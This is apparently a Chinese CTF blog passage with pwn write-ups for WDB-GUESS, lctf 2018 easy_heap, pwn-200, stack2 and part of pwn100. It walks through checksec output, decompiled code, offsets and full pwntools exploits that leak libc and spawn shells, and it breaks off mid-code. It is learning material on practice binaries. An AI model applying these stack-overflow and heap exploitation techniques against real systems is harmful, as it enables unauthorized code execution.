<span class="exturl" data-url="aHR0cDovL2IwbGRmcmV2LnRvcC8yMDE4LzA5LzA1LyVFNyVCRCU5MSVFOSVCQyU4RSVFNiU5RCVBRlB3biVFNCVCOSU4QmJsaW5kLw==">http://b0ldfrev.top/2018/09/05/网鼎杯Pwn之blind/<i class="fa fa-external-link-alt"></i></span></p>
<p>p *(struct _IO_FILE_plus *) stdout</p>
<h2 id="2018-WDB-GUESS">2018-WDB-GUESS</h2>
<p><img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/20210522010905.png" alt="20210522010905"></p>
<p>拖到ida里f5<br>
<img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/20210522011430.png" alt="20210522011430"></p>
<p>程序把flag保存到栈上，然后将输入的值和flag进行比较，如果错误就新fork一个进程。漏洞函数明显在gets上，因为有两次fork的机会，所以可以肆无忌惮地触发canary达到某些目的（stack smash）</p>
<ul>
<li>argv[] 保存了环境变量，argv[0]保存的是程序路径，覆盖argv[0]可以使得触发stack smash的时候输出有用的东西，SS代码如下</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">void</span> __attribute__ ((noreturn)) __stack_chk_fail (<span class="keyword">void</span>)</span><br><span class="line">&#123;</span><br><span class="line">  __fortify_fail (<span class="string">&quot;stack smashing detected&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">void</span> __attribute__ ((noreturn)) internal_function __fortify_fail (<span class="keyword">const</span> <span class="keyword">char</span> *msg)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">/* The loop is added only to keep gcc happy.  */</span></span><br><span class="line">  <span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">    __libc_message (<span class="number">2</span>, <span class="string">&quot;*** %s ***: %s terminated\n&quot;</span>,</span><br><span class="line">                    msg, __libc_argv[<span class="number">0</span>] ?: <span class="string">&quot;&lt;unknown&gt;&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>有两种方法找到argv[0]的地址：</p>
<ol>
<li>在main下断点</li>
<li>print &amp;__libc_argv[0]</li>
</ol>
<p><img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/20210522013616.png" alt="20210522013616"><br>
<img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/20210522013633.png" alt="20210522013633"></p>
<p>接下来就要找到s2和argv[0]之间的距离，这个通过gdb调试就可以得到<br>
这样，如果把argv[0]中的内容改为puts的got地址，就能将其输出，进而得到libc版本</p>
<p>第二步是找到flag在栈中的地址。<br>
在libc中有一个_environ函数，指向栈中保存着环境变量的地址，这个地址和[flag]之间的偏移是不变化的<br>
<img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/20210522020339.png" alt="20210522020339"></p>
<p>wp：</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> LibcSearcher</span><br><span class="line"><span class="comment">#context.log_level = &quot;debug&quot;</span></span><br><span class="line">p = remote(<span class="string">&quot;node3.buuoj.cn&quot;</span>,<span class="number">27846</span>)</span><br><span class="line"><span class="comment">#p = process(&quot;./GUESS&quot;)</span></span><br><span class="line">elf = ELF(<span class="string">&quot;./GUESS&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># argv[0] stores file PATH by default</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># &amp;argv[0]==0x7fffffffde48</span></span><br><span class="line"><span class="comment"># gets-&gt;0x7fffffffdd20</span></span><br><span class="line"></span><br><span class="line">offset1 = <span class="number">0xe48</span> - <span class="number">0xd20</span></span><br><span class="line"><span class="comment">#print hex(offset1)</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;a&quot;</span>*<span class="number">0x128</span> + p64(elf.got[<span class="string">&#x27;puts&#x27;</span>])</span><br><span class="line">p.sendlineafter(<span class="string">&quot;Please type your guessing flag\n&quot;</span>,payload)</span><br><span class="line">p.recvuntil(<span class="string">&quot;: &quot;</span>)</span><br><span class="line"></span><br><span class="line">puts = u64(p.recvuntil(<span class="string">&quot; &quot;</span>)[:-<span class="number">1</span>].ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(puts)</span><br><span class="line"></span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;puts&#x27;</span>, puts)</span><br><span class="line">base = puts - libc.dump(<span class="string">&#x27;puts&#x27;</span>)</span><br><span class="line">environ = base + libc.dump(<span class="string">&#x27;__environ&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span> (environ)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;A&quot;</span>*<span class="number">0x128</span> + p64(environ)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&quot;Please type your guessing flag\n&quot;</span>,payload)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;: &quot;</span>)</span><br><span class="line">environ_addr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(stack)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;a&quot;</span>*<span class="number">0x128</span> + p64(environ_addr - <span class="number">360</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;Please type your guessing flag\n&quot;</span>,payload)</span><br><span class="line"><span class="built_in">print</span> p.recv()</span><br><span class="line"><span class="built_in">print</span> p.recv()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 0x7fffffffde58 - 0x7fffffffdcf0</span></span><br></pre></td></tr></table></figure>
<h2 id="lctf-2018-easy-heap">lctf 2018 easy_heap</h2>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> LibcSearcher</span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&quot;./easy_heap&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;./libc64.so&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">malloc</span>(<span class="params">size,context</span>):</span></span><br><span class="line">	p.sendlineafter(<span class="string">&quot;which command?\n&gt; &quot;</span>,<span class="string">&quot;1&quot;</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;size \n&gt; &quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;content \n&gt; &quot;</span>,<span class="built_in">str</span>(context))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span>(<span class="params">index</span>):</span></span><br><span class="line">	p.sendlineafter(<span class="string">&quot;which command?\n&gt; &quot;</span>,<span class="string">&quot;2&quot;</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;index \n&gt; &quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">index</span>):</span></span><br><span class="line">	p.sendlineafter(<span class="string">&quot;which command?\n&gt; &quot;</span>,<span class="string">&quot;3&quot;</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;index \n&gt; &quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">10</span>):</span><br><span class="line">	malloc(<span class="number">0x10</span>,<span class="string">&quot;111&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># place in unsorted_bin and tcache bin</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>,<span class="number">10</span>):</span><br><span class="line">	free(i)</span><br><span class="line"></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 0x200</span></span><br><span class="line"><span class="comment"># split unsorted chunk</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">7</span>):</span><br><span class="line">	malloc(<span class="number">0x10</span>,<span class="string">&quot;1111&quot;</span>)</span><br><span class="line">malloc(<span class="number">0x10</span>,<span class="string">&quot;77777777&quot;</span>)</span><br><span class="line">malloc(<span class="number">0x10</span>,<span class="string">&quot;88888888&quot;</span>)</span><br><span class="line">malloc(<span class="number">0x10</span>,<span class="string">&quot;99999999&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">6</span>):</span><br><span class="line">	free(i)</span><br><span class="line"></span><br><span class="line">free(<span class="number">8</span>)</span><br><span class="line">free(<span class="number">7</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># chunk 3 prev_inuse</span></span><br><span class="line">malloc(<span class="number">0xf8</span>,<span class="string">&quot;b&quot;</span>*<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line">free(<span class="number">6</span>)</span><br><span class="line">free(<span class="number">9</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line"></span><br><span class="line">	malloc(<span class="number">0x10</span>,<span class="string">&quot;4444&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">malloc(<span class="number">0x10</span>,<span class="string">&quot;5555&quot;</span>)<span class="comment">###?</span></span><br><span class="line"></span><br><span class="line">show(<span class="number">0</span>)<span class="comment">##??</span></span><br><span class="line">uns_bin = u64(p.recvuntil(<span class="string">&#x27;\n&#x27;</span>)[:-<span class="number">1</span>].ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">libc.address = uns_bin - <span class="number">0x3ebca0</span></span><br><span class="line"></span><br><span class="line">malloc(<span class="number">0x10</span>,<span class="string">&quot;9999&quot;</span>)</span><br><span class="line"></span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">free(<span class="number">9</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">one_gadget = libc.address + <span class="number">0x4f322</span></span><br><span class="line"></span><br><span class="line">malloc(<span class="number">0x10</span>,p64(libc.symbols[<span class="string">&#x27;__free_hook&#x27;</span>]))</span><br><span class="line">malloc(<span class="number">0x10</span>,<span class="string">&quot;1111&quot;</span>)</span><br><span class="line"></span><br><span class="line">malloc(<span class="number">0x10</span>,p64(one_gadget))</span><br><span class="line"></span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<p><span class="exturl" data-url="aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxMjAyMjM3L2FydGljbGUvZGV0YWlscy8xMTM2OTc4OTI=">https://blog.csdn.net/qq_41202237/article/details/113697892<i class="fa fa-external-link-alt"></i></span><br>
<span class="exturl" data-url="aHR0cHM6Ly9iYnMucGVkaXkuY29tL3RocmVhZC0yNDc4NjIuaHRt">https://bbs.pediy.com/thread-247862.htm<i class="fa fa-external-link-alt"></i></span></p>
<h2 id="pwn-200">pwn-200</h2>
<p>写这题的时候有半个多月没有接触栈溢出了…算是拿这题复习一下</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pluto@pluto-virtual-machine:~/Desktop$ checksec b</span><br><span class="line">[*] <span class="string">&#x27;/home/pluto/Desktop/b&#x27;</span></span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure>
<p>用ROPgadget搜索没有发现system和/bin/sh，于是猜到大概是要ret2libc</p>
<p>ida打开，程序很简单:</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> buf; <span class="comment">// [esp+2Ch] [ebp-6Ch]</span></span><br><span class="line">  <span class="keyword">int</span> v2; <span class="comment">// [esp+30h] [ebp-68h]</span></span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// [esp+34h] [ebp-64h]</span></span><br><span class="line">  <span class="keyword">int</span> v4; <span class="comment">// [esp+38h] [ebp-60h]</span></span><br><span class="line">  <span class="keyword">int</span> v5; <span class="comment">// [esp+3Ch] [ebp-5Ch]</span></span><br><span class="line">  <span class="keyword">int</span> v6; <span class="comment">// [esp+40h] [ebp-58h]</span></span><br><span class="line">  <span class="keyword">int</span> v7; <span class="comment">// [esp+44h] [ebp-54h]</span></span><br><span class="line"></span><br><span class="line">  buf = <span class="number">1668048215</span>;</span><br><span class="line">  v2 = <span class="number">543518063</span>;</span><br><span class="line">  v3 = <span class="number">1478520692</span>;</span><br><span class="line">  v4 = <span class="number">1179927364</span>;</span><br><span class="line">  v5 = <span class="number">892416050</span>;</span><br><span class="line">  v6 = <span class="number">663934</span>;</span><br><span class="line">  <span class="built_in">memset</span>(&amp;v7, <span class="number">0</span>, <span class="number">0x4C</span>u);</span><br><span class="line">  setbuf(<span class="built_in">stdout</span>, (<span class="keyword">char</span> *)&amp;buf);</span><br><span class="line">  write(<span class="number">1</span>, &amp;buf, <span class="built_in">strlen</span>((<span class="keyword">const</span> <span class="keyword">char</span> *)&amp;buf));</span><br><span class="line">  sub_8048484();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">ssize_t</span> <span class="title">sub_8048484</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [esp+1Ch] [ebp-6Ch]</span></span><br><span class="line"></span><br><span class="line">  setbuf(<span class="built_in">stdin</span>, &amp;buf);</span><br><span class="line">  <span class="keyword">return</span> read(<span class="number">0</span>, &amp;buf, <span class="number">256u</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>发现sub_8048484()存在栈溢出</p>
<p>复习一下找libc版本–&gt;getshell的步骤：</p>
<ol>
<li>用puts、write、printf之类的函数打印出某个函数的got，同时要控制好打印后的返回地址</li>
<li>获得libc的版本、system函数，/bin/sh的地址等，并计算在plt中的位置</li>
<li>构造payload</li>
</ol>
<p>这题我们使用write()打印出write.got：</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">write_plt = elf.plt[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">write_got = elf.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line"></span><br><span class="line">addr_out = <span class="string">&#x27;a&#x27;</span>*<span class="number">112</span> + p32(write_plt) + p32(<span class="number">0x080483D0</span>) + p32(<span class="number">1</span>) + p32(write_got) +p32(<span class="number">4</span>)</span><br><span class="line"><span class="comment">#1+write_got+4==write(..,..,..)</span></span><br><span class="line"><span class="comment">#返回地址为程序入口地址</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;\n&#x27;</span>, addr_out)</span><br><span class="line">a = u32(p.recvn(<span class="number">4</span>))</span><br><span class="line">write_got_addr =  a</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(write_got_addr)</span><br></pre></td></tr></table></figure>
<p>这里提示一下，“p32(1) + p32(write_got) +p32(4)”构造的是一个write函数的参数，之前看别人的wp想了好久1和4是啥…太蠢了</p>
<p>用低12位搜索libc的时候注意，查看的是16进制的地址，别再在这卡一个晚上了…将地址和偏移地址进行计算的时候不用转成16进制（str和int的问题）</p>
<p>后续的代码：</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">write_off = <span class="number">0x0d43c0</span></span><br><span class="line">sys_off = <span class="number">0x03a940</span></span><br><span class="line">binsh_off = <span class="number">0x15902b</span></span><br><span class="line"></span><br><span class="line">base = write_got_addr - write_off</span><br><span class="line">sys = sys_off + base</span><br><span class="line">binsh = binsh_off + base</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> p.recv()</span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">112</span> + p32(sys) + p32(<span class="number">1</span>) + p32(binsh)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<p>这个payload比较简短，看到另一种做法如下：</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment">#第一次结束后返回start的地址</span></span><br><span class="line"></span><br><span class="line">ppp_addr=<span class="number">0x0804856c</span></span><br><span class="line"><span class="comment">#三次pop指令的地址</span></span><br><span class="line">bss_addr=elf.bss()</span><br><span class="line">payload2 =<span class="string">&#x27;A&#x27;</span>*junk+p32(read_plt)+p32(ppp_addr)+p32(<span class="number">0</span>)+p32(bss_addr)+p32(<span class="number">8</span>)</span><br><span class="line"><span class="comment">#在实际调用system前，需要通过三次pop操作来将栈指针指向systemAddress</span></span><br><span class="line"><span class="comment">#read(0,bss_addr,8)把&#x27;/bin/sh&#x27;读到bss段上，因为bss段可执行</span></span><br><span class="line">payload2+=p32(sys_addr)+p32(func_addr)+p32(bss_addr)</span><br><span class="line"><span class="comment">#用三次pop把指针指向了systemAddress，此时调用system()函数，再栈溢出把bss段上的内容(&#x27;/bin/sh&#x27;)当作参数传给system()调用</span></span><br><span class="line">r.send(payload2)</span><br><span class="line">r.send(<span class="string">&#x27;/bin/sh&#x27;</span>)</span><br></pre></td></tr></table></figure>
<p>思路值得学习</p>
<h2 id="stack2">stack2</h2>
<p>首先checksec：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pluto@pluto-virtual-machine:~/Desktop$ checksec stack2</span><br><span class="line">[*] <span class="string">&#x27;/home/pluto/Desktop/stack2&#x27;</span></span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure>
<p>32位程序，嗯 回忆一下传参方式，是直接放在函数后面，没有用到寄存器的<br>
看到有栈溢出保护，似乎先要泄露canary，继续。</p>
<p>程序很简单，修饰一些变量名后如下(忽略无关语句)：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> stack_size; <span class="comment">// [esp+18h] [ebp-90h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> choose; <span class="comment">// [esp+1Ch] [ebp-8Ch]</span></span><br><span class="line">  <span class="keyword">int</span> v7; <span class="comment">// [esp+20h] [ebp-88h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> j; <span class="comment">// [esp+24h] [ebp-84h]</span></span><br><span class="line">  <span class="keyword">int</span> v9; <span class="comment">// [esp+28h] [ebp-80h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> i; <span class="comment">// [esp+2Ch] [ebp-7Ch]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> k; <span class="comment">// [esp+30h] [ebp-78h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> l; <span class="comment">// [esp+34h] [ebp-74h]</span></span><br><span class="line">  <span class="keyword">char</span> number[<span class="number">100</span>]; <span class="comment">// [esp+38h] [ebp-70h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> canary; <span class="comment">// [esp+9Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//blah blah blah</span></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;How many numbers you have:&quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;stack_size);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Give me your numbers&quot;</span>);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; stack_size &amp;&amp; (<span class="keyword">signed</span> <span class="keyword">int</span>)i &lt;= <span class="number">99</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;v7);</span><br><span class="line">    number[i] = v7;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">for</span> ( j = stack_size; ; <span class="built_in">printf</span>(<span class="string">&quot;average is %.2lf\n&quot;</span>, (<span class="keyword">double</span>)((<span class="keyword">long</span> <span class="keyword">double</span>)v9 / (<span class="keyword">double</span>)j)) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="built_in">puts</span>(<span class="string">&quot;1. show numbers\n2. add number\n3. change number\n4. get average\n5. exit&quot;</span>);</span><br><span class="line">          __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;choose);</span><br><span class="line">          <span class="keyword">if</span> ( choose != <span class="number">2</span> )</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">          <span class="built_in">puts</span>(<span class="string">&quot;Give me your number&quot;</span>);</span><br><span class="line">          __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;v7);</span><br><span class="line">          <span class="keyword">if</span> ( j &lt;= <span class="number">99</span> )</span><br><span class="line">          &#123;</span><br><span class="line">            v3 = j++;</span><br><span class="line">            number[v3] = v7;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> ( choose &gt; <span class="number">2</span> )</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">if</span> ( choose != <span class="number">1</span> )</span><br><span class="line">          <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;id\t\tnumber&quot;</span>);</span><br><span class="line">        <span class="keyword">for</span> ( k = <span class="number">0</span>; k &lt; j; ++k )</span><br><span class="line">          <span class="built_in">printf</span>(<span class="string">&quot;%d\t\t%d\n&quot;</span>, k, number[k]);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> ( choose != <span class="number">3</span> )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;which number to change:&quot;</span>);</span><br><span class="line">      __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;stack_size);</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;new number:&quot;</span>);</span><br><span class="line">      __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;v7);</span><br><span class="line">      number[stack_size] = v7;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( choose != <span class="number">4</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    v9 = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> ( l = <span class="number">0</span>; l &lt; j; ++l )</span><br><span class="line">      v9 += number[l];</span><br><span class="line">  &#125;  </span><br><span class="line">  <span class="comment">//无力吐槽f5出的代码，不过...能看就行   </span></span><br></pre></td></tr></table></figure>
<p>可以发现在选择3时，没有对输入的stack_size进行判断，所以可以更改栈中任意地址内容的，而且不会被canary发现。<br>
再看程序的函数，发现有system()和一个“hackhere”函数，直接返回了system(“/bin/sh”)（这是一个陷阱，在远程环境里没有用bash，而是使用了sh，但这个函数也提供了sh这个字符串）</p>
<p>所以现在的思路就是，通过choose=3，构造函数的返回地址为system的plt和参数，这就需要找到number这个数组的起始位置和返回地址的偏移量<br>
看ida，似乎偏移是0x74，但是究竟是不是呢？还是通过gdb验证一下吧</p>
<p>我们先把断点断在第一次向number数组输入的时候。此时写入的地址即为数组的首地址<br>
<img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/20201207210639.png" alt="20201207210639"><br>
（前面输入的内容都为1）</p>
<p>执行前：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">EAX  0xffffcf18 ◂— 0xe0</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/20201207211134.png" alt="20201207211134"></p>
<p>执行后：<br>
<img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/20201207211413.png" alt="20201207211413"></p>
<p>所以首地址在cf18的位置，查看此时栈帧<br>
<img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/20201207211929.png" alt="20201207211929"><br>
所以偏移为：cf9c-cf18==0x84<br>
(ida错了！！！)</p>
<p>因此可以易得exp了：</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line"><span class="comment">#p = process(&quot;./stack2&quot;)</span></span><br><span class="line">p = remote(<span class="string">&quot;220.249.52.133&quot;</span>, <span class="number">53339</span>)</span><br><span class="line"><span class="built_in">print</span> p.recv()</span><br><span class="line">p.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&quot;numbers\n&quot;</span>,<span class="string">&quot;1&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">change</span>(<span class="params">addr,data</span>):</span></span><br><span class="line">	addr = <span class="built_in">str</span>(addr)</span><br><span class="line">	data = <span class="built_in">str</span>(data)</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;exit\n&quot;</span>,<span class="string">&quot;3&quot;</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;change:\n&quot;</span>,addr)</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;number:\n&quot;</span>,data)</span><br><span class="line"></span><br><span class="line"><span class="comment">#sys: 0x08048450</span></span><br><span class="line">change(<span class="number">0x84</span>, <span class="number">0x50</span>)</span><br><span class="line">change(<span class="number">0x84</span>+<span class="number">1</span>,<span class="number">0x84</span>)</span><br><span class="line">change(<span class="number">0x84</span>+<span class="number">2</span>,<span class="number">0x04</span>)</span><br><span class="line">change(<span class="number">0x84</span>+<span class="number">3</span>,<span class="number">0x08</span>)</span><br><span class="line"><span class="comment">#sh: 0x08048987</span></span><br><span class="line">change(<span class="number">0x84</span>+<span class="number">8</span>,<span class="number">0x87</span>)</span><br><span class="line">change(<span class="number">0x84</span>+<span class="number">8</span>+<span class="number">1</span>,<span class="number">0x89</span>)</span><br><span class="line">change(<span class="number">0x84</span>+<span class="number">8</span>+<span class="number">2</span>,<span class="number">0x04</span>)</span><br><span class="line">change(<span class="number">0x84</span>+<span class="number">8</span>+<span class="number">3</span>,<span class="number">0x08</span>)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&quot;exit\n&quot;</span>,<span class="string">&quot;5&quot;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<p>getshell</p>
<h2 id="pwn100">pwn100</h2>
<p>checksec :</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pluto@pluto-virtual-machine:~/Desktop$ checksec pwn100 </span><br><span class="line">[*] <span class="string">&#x27;/home/pluto/Desktop/pwn100&#x27;</span></span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure>
<p>partial relro+NX<br>
进入ida&amp;f5，经过两次调用后看到主要的函数为：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">sub_40063D</span><span class="params">(__int64 a1, <span class="keyword">signed</span> <span class="keyword">int</span> a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> i; <span class="comment">// [rsp+1Ch] [rbp-4h] a2==200</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; ; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    result = (<span class="keyword">unsigned</span> <span class="keyword">int</span>)i;</span><br><span class="line">    <span class="keyword">if</span> ( i &gt;= a2 )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    read(<span class="number">0</span>, (<span class="keyword">void</span> *)(i + a1), <span class="number">1uLL</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span 